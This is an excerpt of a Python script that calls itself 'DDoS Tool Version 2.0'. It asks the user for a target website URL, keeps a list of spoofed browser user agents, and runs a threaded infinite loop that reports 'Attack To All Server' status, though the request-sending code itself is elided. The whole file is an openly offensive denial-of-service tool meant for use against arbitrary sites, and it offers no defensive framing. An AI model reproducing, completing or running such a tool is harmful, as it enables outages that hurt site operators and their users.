...
def banner():
    ...
    ╔══════════════════════════════════════════════════════╗
    ║    DDoS Tool . Version 2.0 | Cre by: MinhIOS         ║
    ╚══════════════════════════════════════════════════════╝   
    """))

banner()
print("\033[1;31m!!KHI NHẬP WEBSITE LƯU Í PHẢI NHẬP https://")
host = input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] URL ATTACK WEBSITE: "))
...
user_agents = [
    ...
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 8 Pro) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
...
def ddos():
    while True:
        ...
        try:
            ...
            print(Colorate.Horizontal(Colors.red_to_white, f"[{threading.current_thread().ident}] ---> Attack To All Server: [{host}] | Status: [{status}]"))
